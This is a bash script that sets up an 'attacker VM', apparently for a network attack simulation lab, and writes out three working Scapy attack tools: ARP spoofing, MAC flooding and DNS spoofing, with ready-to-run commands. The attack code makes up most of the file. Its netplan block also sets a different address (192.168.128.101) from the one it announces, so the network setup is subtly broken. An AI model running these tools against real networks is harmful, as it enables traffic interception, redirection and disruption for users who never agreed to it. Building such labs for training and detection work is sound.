#!/bin/bash
# Attacker VM Setup Script
# Usage: ssh attacker@192.168.100.101 'bash -s' < setup_attacker_vm.sh

set -e

echo "╔════════════════════════════════════════════════╗"
echo "║    SecureNet Attacker VM Setup Script          ║"
echo "║    Setting up attack simulation environment    ║"
echo "╚════════════════════════════════════════════════╝"
echo ""

# =============================================================================
# STEP 1: System Update
# =============================================================================
echo "📦 STEP 1: Updating system packages..."
sudo apt-get update -qq
sudo apt-get upgrade -y -qq
echo "✅ System updated"
echo ""

# =============================================================================
# STEP 2: Hostname Configuration
# =============================================================================
echo "🏷️  STEP 2: Configuring hostname..."
sudo hostnamectl set-hostname attacker-kali
echo "127.0.0.1 attacker-kali" | sudo tee -a /etc/hosts > /dev/null
echo "✅ Hostname set to: attacker-kali"
echo ""

# =============================================================================
# STEP 3: Network Configuration (Static IP)
# =============================================================================
echo "🌐 STEP 3: Configuring static IP (192.168.100.101/24)..."

# Detect interface (Kali often uses eth0)
INTERFACE=$(ip link show | grep "eth0\|enp0s1\|ens3" | head -1 | awk '{print $2}' | sed 's/:$//')

if [ -z "$INTERFACE" ]; then
    echo "❌ Could not detect network interface"
    echo "Available interfaces:"
    ip link show
    exit 1
fi

echo "   Using interface: $INTERFACE"

# Create netplan config
sudo tee /etc/netplan/00-installer-config.yaml > /dev/null << 'EOF'
network:
  version: 2
  ethernets:
    eth0:
      dhcp4: no
      addresses:
        - 192.168.128.101/24
      routes:
        - to: 0.0.0.0/0
          via: 192.168.128.1
      nameservers:
        addresses: [8.8.8.8, 8.8.4.4]
EOF

sudo netplan apply
echo "✅ Static IP configured"
echo ""

# =============================================================================
# STEP 4: Install Attack Tools
# =============================================================================
echo "⚔️  STEP 4: Installing attack tools..."
sudo apt-get install -y -qq \
    python3-pip \
    python3-dev \
    hping3 \
    dnsmasq \
    tcpdump \
    net-tools \
    iputils-ping \
    curl \
    git

echo "✅ Attack tools installed"
echo ""

# =============================================================================
# STEP 5: Install Python Attack Libraries
# =============================================================================
echo "🐍 STEP 5: Installing Python attack libraries..."
pip3 install --upgrade -q pip setuptools wheel
pip3 install -q \
    scapy \
    netaddr

echo "✅ Python libraries installed"
echo ""

# =============================================================================
# STEP 6: Create Attack Scripts Directory
# =============================================================================
echo "📁 STEP 6: Creating attack scripts directory..."
mkdir -p ~/attack_scripts
chmod 755 ~/attack_scripts
echo "✅ Attack scripts directory created"
echo ""

# =============================================================================
# STEP 7: Create Reusable Attack Scripts
# =============================================================================
echo "🔨 STEP 7: Creating reusable attack scripts..."

cat > ~/attack_scripts/arp_spoof.py << 'EOF'
#!/usr/bin/env python3
"""
ARP Spoofing Attack Script
Usage: sudo python3 arp_spoof.py --victim 192.168.100.6 --gateway 192.168.100.1 --interface eth0
"""

import sys
import argparse
from scapy.all import ARP, Ether, sendp

def arp_spoof(victim_ip, gateway_ip, interface, count=500):
    """Send forged ARP replies"""
    print(f"[*] Starting ARP spoof attack")
    print(f"    Victim IP: {victim_ip}")
    print(f"    Gateway IP: {gateway_ip}")
    print(f"    Interface: {interface}")
    print(f"    Packets: {count}")
    print("")
    
    # Create forged ARP packets
    pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=gateway_ip, pdst=victim_ip)
    pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=victim_ip, pdst=gateway_ip)
    
    packets = []
    for _ in range(count):
        packets.append(pkt1)
        packets.append(pkt2)
    
    try:
        sendp(packets, iface=interface, verbose=False)
        print("[✓] ARP spoof packets sent successfully")
        print(f"[✓] Total packets: {len(packets)}")
    except Exception as e:
        print(f"[✗] Error sending packets: {e}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Attack")
    parser.add_argument("--victim", default="192.168.100.6", help="Victim IP")
    parser.add_argument("--gateway", default="192.168.100.1", help="Gateway IP")
    parser.add_argument("--interface", default="eth0", help="Interface")
    parser.add_argument("--count", type=int, default=500, help="Number of packets")
    
    args = parser.parse_args()
    
    if "sudo" not in sys.argv[0]:
        print("[!] Run with sudo: sudo python3 arp_spoof.py")
    
    arp_spoof(args.victim, args.gateway, args.interface, args.count)
EOF

chmod +x ~/attack_scripts/arp_spoof.py

cat > ~/attack_scripts/mac_flood.py << 'EOF'
#!/usr/bin/env python3
"""
MAC Flooding Attack Script
Usage: sudo python3 mac_flood.py --target 192.168.100.6 --attacker 192.168.100.101 --interface eth0
"""

import sys
import argparse
import random
from scapy.all import Ether, IP, sendp

def mac_flood(target_ip, attacker_ip, interface, count=1000):
    """Send packets with random source MACs"""
    print(f"[*] Starting MAC flood attack")
    print(f"    Target IP: {target_ip}")
    print(f"    Attacker IP: {attacker_ip}")
    print(f"    Interface: {interface}")
    print(f"    Packets: {count}")
    print("")
    
    try:
        for i in range(count):
            random_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % (
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255)
            )
            
            packet = Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") / IP(src=attacker_ip, dst=target_ip)
            sendp(packet, iface=interface, verbose=False)
            
            if (i + 1) % 100 == 0:
                print(f"[*] Sent {i + 1} packets...")
        
        print(f"[✓] MAC flood complete! Total packets: {count}")
    except Exception as e:
        print(f"[✗] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MAC Flooding Attack")
    parser.add_argument("--target", default="192.168.100.6", help="Target IP")
    parser.add_argument("--attacker", default="192.168.100.101", help="Attacker IP")
    parser.add_argument("--interface", default="eth0", help="Interface")
    parser.add_argument("--count", type=int, default=1000, help="Number of packets")
    
    args = parser.parse_args()
    
    mac_flood(args.target, args.attacker, args.interface, args.count)
EOF

chmod +x ~/attack_scripts/mac_flood.py

cat > ~/attack_scripts/dns_spoof.py << 'EOF'
#!/usr/bin/env python3
"""
DNS Spoofing Attack Script
Usage: sudo python3 dns_spoof.py --victim 192.168.100.6 --attacker 192.168.100.101 --interface eth0
"""

import sys
import argparse
import random
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sendp

def dns_spoof(victim_ip, attacker_ip, interface, target_domain="google.com", count=50):
    """Send forged DNS responses"""
    print(f"[*] Starting DNS spoof attack")
    print(f"    Victim IP: {victim_ip}")
    print(f"    Attacker IP: {attacker_ip}")
    print(f"    Domain: {target_domain}")
    print(f"    Interface: {interface}")
    print(f"    Packets: {count}")
    print("")
    
    try:
        for i in range(count):
            packet = IP(src=attacker_ip, dst=victim_ip) / \
                     UDP(sport=53, dport=random.randint(10000, 60000)) / \
                     DNS(id=random.randint(0, 65535), qr=1, rd=1, ra=1,
                         qd=DNSQR(qname=target_domain),
                         an=DNSRR(rrname=target_domain, ttl=10, rdata=attacker_ip))
            
            sendp(packet, iface=interface, verbose=False)
            
            if (i + 1) % 10 == 0:
                print(f"[*] Sent {i + 1} packets...")
        
        print(f"[✓] DNS spoof complete! Total packets: {count}")
    except Exception as e:
        print(f"[✗] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Spoofing Attack")
    parser.add_argument("--victim", default="192.168.100.6", help="Victim IP")
    parser.add_argument("--attacker", default="192.168.100.101", help="Attacker IP")
    parser.add_argument("--interface", default="eth0", help="Interface")
    parser.add_argument("--domain", default="google.com", help="Target domain")
    parser.add_argument("--count", type=int, default=50, help="Number of packets")
    
    args = parser.parse_args()
    
    dns_spoof(args.victim, args.attacker, args.interface, args.domain, args.count)
EOF

chmod +x ~/attack_scripts/dns_spoof.py

echo "✅ Attack scripts created:"
echo "   - ~/attack_scripts/arp_spoof.py"
echo "   - ~/attack_scripts/mac_flood.py"
echo "   - ~/attack_scripts/dns_spoof.py"
echo ""

# =============================================================================
# STEP 8: Verify Connectivity
# =============================================================================
echo "✔️  STEP 8: Verifying connectivity..."

echo "  Testing ping to gateway..."
ping -c 1 192.168.100.1 > /dev/null && echo "    ✓ Gateway reachable" || echo "    ✗ Gateway not reachable"

echo "  Testing ping to victim..."
ping -c 1 192.168.100.6 > /dev/null && echo "    ✓ Victim reachable" || echo "    ✗ Victim not reachable"

echo "  Testing Python Scapy..."
python3 -c "from scapy.all import *; print('    ✓ Scapy available')" || echo "    ✗ Scapy issue"

echo "  Testing hping3..."
which hping3 > /dev/null && echo "    ✓ hping3 available" || echo "    ✗ hping3 issue"

echo ""
echo "╔════════════════════════════════════════════════╗"
echo "║     Attacker VM Setup Complete! ✅            ║"
echo "╚════════════════════════════════════════════════╝"
echo ""
echo "Attack scripts ready at: ~/attack_scripts/"
echo ""
echo "Quick attack commands:"
echo "  1. ARP Spoof:"
echo "     sudo python3 ~/attack_scripts/arp_spoof.py"
echo ""
echo "  2. MAC Flood:"
echo "     sudo python3 ~/attack_scripts/mac_flood.py --count 1000"
echo ""
echo "  3. DNS Spoof:"
echo "     sudo python3 ~/attack_scripts/dns_spoof.py --domain google.com"
echo ""
